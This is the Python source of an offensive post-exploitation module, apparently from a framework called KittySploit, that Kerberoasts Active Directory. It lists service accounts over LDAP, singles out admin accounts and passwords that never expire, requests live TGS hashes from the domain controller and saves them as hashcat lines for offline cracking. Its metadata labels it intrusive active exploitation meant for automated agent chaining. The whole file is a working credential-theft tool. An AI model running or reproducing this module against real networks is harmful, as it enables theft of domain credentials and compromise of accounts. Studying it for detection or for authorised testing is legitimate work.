from kittysploit import *
from lib.protocols.ldap.ldap_post_client import LdapPostClient
from lib.protocols.ldap.ad_helpers import UAC_DONT_EXPIRE_PASSWD
from lib.protocols.kerberos.roast import KerberosError, request_tgs_hashes
from lib.protocols.kerberos.roast_helpers import resolve_auth, resolve_kdc
from lib.post.windows.hash_loot import save_hash_loot


class Module(Post, LdapPostClient):

	__info__ = {
		"name": "LDAP Kerberoast (native)",
		"description": (
			"Native kerberoasting: LDAP enum of user SPNs, then request live "
			"$krb5tgs$ hashes from the KDC using session or explicit credentials. "
			"No Rubeus / Impacket required."
		),
		"author": "KittySploit Team",
		"session_type": SessionType.LDAP,
		"tags": ["ad", "ldap", "kerberos", "kerberoast", "native"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "network_probe"],
			"expected_requests": 6,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials", "risk_signals"],
			"cost": 1.0,
			"noise": 0.45,
			"value": 1.6,
			"chain": {
				"consumes_capabilities": ["ldap_access"],
				"produces_capabilities": ["kerberoast_targets", "kerberos_hashes"],
			},
		},
	}

	include_disabled = OptBool(False, "Include disabled accounts", False)
	admin_only = OptBool(False, "Only show adminCount=1 accounts", False)
	request_hashes = OptBool(True, "Request live TGS hashes from KDC", False)
	dc_ip = OptString("", "KDC host/IP (default: LDAP session host)", False)
	kdc_port = OptPort(88, "Kerberos KDC port", False)
	auth_user = OptString("", "Domain user for TGT (default: LDAP bind user)", False)
	auth_password = OptString("", "Password for TGT (default: LDAP bind password)", False)
	auth_nthash = OptString("", "NT hash instead of password (32 hex)", False)
	save_loot = OptBool(True, "Write hashcat lines to output/loot/", False)

	def run(self):
		try:
			print_info("=" * 80)
			print_status(f"Kerberoastable users in {self.base_dn or '(domain)'}")
			filter_parts = [
				"(&(objectClass=user)",
				"(servicePrincipalName=*)",
				"(!(objectClass=computer))",
			]
			if not self.include_disabled:
				filter_parts.append("(!(userAccountControl:1.2.840.113556.1.4.803:=2))")
			filter_parts.append(")")
			rows = self.search(
				"".join(filter_parts),
				[
					"sAMAccountName",
					"servicePrincipalName",
					"userPrincipalName",
					"adminCount",
					"userAccountControl",
				],
			)
			if self.admin_only:
				rows = [row for row in rows if self.attr_int(row, "adminCount") == 1]

			if not rows:
				print_warning("No Kerberoastable accounts found")
				return True

			targets = []
			for entry in rows:
				sam = self.attr_str(entry, "sAMAccountName")
				upn = self.attr_str(entry, "userPrincipalName")
				spns = self.attr_list(entry, "servicePrincipalName")
				admin = self.attr_int(entry, "adminCount") == 1
				uac = self.attr_int(entry, "userAccountControl")
				never_expire = bool(uac & UAC_DONT_EXPIRE_PASSWD)
				print_info(f"\n  {sam}")
				if upn:
					print_info(f"    UPN: {upn}")
				if admin:
					print_info("    adminCount: 1")
				if never_expire:
					print_info("    password: does not expire")
				for spn in spns:
					print_info(f"    SPN: {spn}")
					if sam and spn:
						targets.append((spn, sam))

			print_info("=" * 80)
			print_success(f"Found {len(rows)} Kerberoastable account(s)")

			if not self.request_hashes:
				print_info("Set request_hashes=true to pull live $krb5tgs$ hashes")
				return True

			kdc = resolve_kdc(self, str(self.dc_ip or ""))
			user, domain, password, nthash = resolve_auth(
				self,
				username=str(self.auth_user or ""),
				password=str(self.auth_password or ""),
				nthash=str(self.auth_nthash or ""),
				domain=self.domain or "",
			)
			if not kdc:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"KDC host unknown — set dc_ip or use an LDAP session with host",
				)
			if not domain or not user:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"Domain user required — set auth_user or use a bound LDAP session",
				)
			if not password and not nthash:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"Password or auth_nthash required to obtain a TGT",
				)

			print_status(f"Kerberoasting {len(targets)} SPN(s) via {kdc} as {user}@{domain}")
			hashes = request_tgs_hashes(
				user,
				domain,
				kdc,
				targets,
				password=password,
				nthash=nthash,
				port=int(self.kdc_port or 88),
			)
			for rh in hashes:
				print_success(rh.hash)

			if hashes and self.save_loot:
				path = save_hash_loot(
					[h.as_loot() for h in hashes],
					kind="krb5tgs",
					session_id=self._session_id_value(),
				)
				if path:
					print_success(f"Loot saved: {path}")
			elif not hashes:
				print_warning("No TGS hashes obtained (check creds / KDC / SPNs)")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Native kerberoast failed: {exc}"
			)
